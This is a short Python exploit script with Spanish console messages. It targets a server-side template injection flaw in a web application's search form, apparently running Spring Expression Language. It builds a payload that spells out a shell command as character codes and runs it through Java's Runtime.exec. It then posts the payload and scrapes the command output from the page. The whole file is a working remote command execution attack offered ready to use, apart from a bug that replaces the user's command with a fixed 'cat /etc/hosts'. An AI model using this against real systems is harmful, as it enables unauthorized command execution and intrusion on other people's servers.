#!/usr/bin/python3

import requests, sys, pdb, signal, os, time

def def_handler(sig, frame):
    print("\n\n[!]Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print("\n\n[!] El programa ha sido ejecutado incorrectamente \n")
    print('\t[+] Uso: python3 %s "whoami"' % sys.argv[0])
    sys.exit(1)

def makePayload():

   command = sys.argv[1]

   command = "cat /etc/hosts"

   payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(command[0])

   command = command[1:]

   for character in command:
       payload += ".concat(T(java.lang.Character).toString(%s))" % ord(character)

   payload += ").getInputStream())}"

   return payload

def makeRequest(payload):
    search_url = "http://<change-me>:8080/search"
    post_data = {
        'name': payload
    }

    r = requests.post(search_url, data=post_data)
    
    f = open("output.txt", "w")
    f.write(r.text)
    f.close()
    
    os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class=\"searched\">You searched for: //' | sed 's/<\/h2>//'")
    os.remove("output.txt")

if __name__ == '__main__':
    payload = makePayload()
    makeRequest(payload)

